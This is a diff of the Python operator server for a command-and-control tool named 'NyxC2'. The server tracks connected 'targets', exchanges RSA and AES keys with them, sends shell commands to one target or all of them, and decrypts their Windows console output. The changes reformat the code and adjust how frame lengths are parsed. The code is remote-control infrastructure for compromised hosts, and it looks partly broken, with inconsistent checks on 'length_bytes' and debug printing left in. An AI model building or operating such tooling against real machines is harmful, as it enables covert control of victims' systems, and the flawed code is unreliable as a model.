@@ -41,24 +41,21 @@ def server():
                 print(f"Connection from {addressguest}")
                 if not clientsocket in server_list:
                     server_list.append(clientsocket)
-                    
-                    
+
                 if not addressguest in dict_ip:
                     # addressguest contains (IP, port); only the IP is used as
                     # the default name displayed in the operator console.
                     print("connected")
                     dict_ip[addressguest[0]] = (clientsocket, True, None)
-                    
+
                     # print(str(public_key))
-                    
+
                     length = len(public_key)
                     header = struct.pack("<I", length)
                     # print(type(header))
                     # print(type(public_key))
-                    
-                    clientsocket.sendall(
-                        header + public_key
-                    )
+
+                    clientsocket.sendall(header + public_key)
 
             elif elem == sys.stdin:
                 # Standard input is handled as an event source. The first word
@@ -82,7 +79,6 @@ def server():
                             old_name = order.strip().split(" ")[1]
                             new_name = order.strip().split(" ")[2]
                             try:
-
                                 dict_ip[new_name] = dict_ip[old_name]
                                 del dict_ip[old_name]
                             except:
@@ -100,12 +96,18 @@ def server():
                         case "help":
                             # Print the commands supported by the operator UI.
                             print("\n---  NyxC2 Master Commands  ---")
-                            print("mc list               : Show all active connected targets")
+                            print(
+                                "mc list               : Show all active connected targets"
+                            )
                             print("mc rename <old> <new> : Rename a target's alias/IP")
-                            print("mc connect <target>   : Test connection to a specific target")
+                            print(
+                                "mc connect <target>   : Test connection to a specific target"
+                            )
                             print("mc help               : Display this help menu")
                             print("mc kill  <target|*>   : close script for a target")
-                            print("<target|*> <command>  : Send a command to target(s). * for all targets")
+                            print(
+                                "<target|*> <command>  : Send a command to target(s). * for all targets"
+                            )
                             print("------------------------------------\n")
 
                         case "kill":
@@ -130,39 +132,20 @@ def server():
                         nom_cible = name
                         break
                 try:
-
                     length_bytes = elem.recv(5)
-                    
+
                     # print(length_bytes)
                     if len(length_bytes) >= 5:
-                        length = struct.unpack("<I", length_bytes[:3])[0] #error when target is disconnected
+                        length = struct.unpack("<I", length_bytes[:4])[
+                            0
+                        ]  # error when target is disconnected
                         type_byte = length_bytes[4]
                         ciphertext = elem.recv(length - 1)
                     else:
-                        type_byte = 0x00
                         ciphertext = b""
-                    
-                    
-                    
+                        length_bytes = 0
 
-
-                    plaintext = ""
-
-                    print("ciphertext" + str(ciphertext))
-
-
-                    match type_byte:
-                        case 0x00:
-                            print("error in importation")
-                        case 0x01:
-                            aes_key = rsa_decryption(private_key, ciphertext)
-                            dict_ip[nom_cible] = (elem, True, aes_key)
-                            print(dict_ip[nom_cible][2])
-                            print("key imported line 156")
-                        case 0x02:
-                            plaintext = aes_decrypt(dict_ip[nom_cible][2], ciphertext)
-                            
-                    print("plaintext" + str(plaintext))
+                    plaintext = "empty"
 
                     if length_bytes == 0:
                         print(f"connection lost with {nom_cible}")
@@ -171,27 +154,29 @@ def server():
                         if nom_cible in dict_ip:
                             del dict_ip[nom_cible]
                         elem.close()
-                        
-                        
+
                     else:
                         # Decode command output using the Windows code page
                         # commonly used by console applications. Invalid bytes
                         # are replaced so decoding cannot stop the event loop.
-                        # new_data = new_data.decode("cp850", errors="replace").strip()
 
                         if length_bytes != 4:
-                            type_byte = frame[0]
-                            ciphertext = frame[1:]
                             match type_byte:
                                 case 0x01:
                                     aes_key = rsa_decryption(private_key, ciphertext)
                                     dict_ip[nom_cible] = (elem, True, aes_key)
-                                    print("key imported line 183")
                                     print(dict_ip[nom_cible][2])
+                                    print("key imported")
                                 case 0x02:
                                     plaintext = aes_decrypt(
                                         dict_ip[nom_cible][2], ciphertext
                                     )
+                                    new_data = plaintext.decode("cp850", errors="replace").strip()
+                                    print(f"[answer from {nom_cible}] : {new_data}")
+
+                            print("ciphertext\n" + str(ciphertext))
+
+                            print("plaintext\n" + str(plaintext))
 
                             new_data = plaintext
                             print(f"\n[answer from {nom_cible}] :\n {new_data}")
